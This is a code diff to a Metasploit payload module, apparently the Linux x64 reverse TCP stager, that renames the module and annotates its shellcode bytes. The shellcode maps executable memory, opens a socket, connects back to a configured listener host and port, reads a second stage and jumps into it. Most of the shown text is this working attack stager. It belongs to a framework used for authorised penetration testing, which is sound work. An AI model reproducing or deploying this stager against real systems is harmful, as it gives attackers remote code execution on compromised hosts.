@@ -7,7 +7,7 @@
 require 'msf/core'
 require 'msf/core/handler/reverse_tcp'
 
-module Metasploit3
+module MetasploitModule
 
   CachedSize = 68
 
@@ -21,7 +21,7 @@ module Metasploit3
       'Author'        => 'ricky',
       'License'       => MSF_LICENSE,
       'Platform'      => 'linux',
-      'Arch'          => ARCH_X86_64,
+      'Arch'          => ARCH_X64,
       'Handler'       => Msf::Handler::ReverseTcp,
       'Stager'        =>
         {
@@ -42,6 +42,7 @@ module Metasploit3
             "\x41\x5a"                     + # pop    %r10
             "\xb2\x07"                     + # mov    $0x7,%dl
             "\x0f\x05"                     + # syscall
+            # mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
             "\x56"                         + # push   %rsi
             "\x50"                         + # push   %rax
             "\x6a\x29"                     + # pushq  $0x29
@@ -52,10 +53,11 @@ module Metasploit3
             "\x6a\x01"                     + # pushq  $0x1
             "\x5e"                         + # pop    %rsi
             "\x0f\x05"                     + # syscall
+            # socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
             "\x48\x97"                     + # xchg   %rax,%rdi
             "\x48\xb9\x02\x00"             + # movabs $0x100007fb3150002,%rcx
-            "\x15\xb3"                     + #
-            "\x7f\x00\x00\x01"             + #
+            "\x15\xb3"                     + # LPORT
+            "\x7f\x00\x00\x01"             + # LHOST
             "\x51"                         + # push   %rcx
             "\x48\x89\xe6"                 + # mov    %rsp,%rsi
             "\x6a\x10"                     + # pushq  $0x10
@@ -63,10 +65,12 @@ module Metasploit3
             "\x6a\x2a"                     + # pushq  $0x2a
             "\x58"                         + # pop    %rax
             "\x0f\x05"                     + # syscall
+            # connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
             "\x59"                         + # pop    %rcx
             "\x5e"                         + # pop    %rsi
             "\x5a"                         + # pop    %rdx
             "\x0f\x05"                     + # syscall
+            # read(3, "", 4096)
             "\xff\xe6"                       # jmpq   *%rsi
         }
       ))
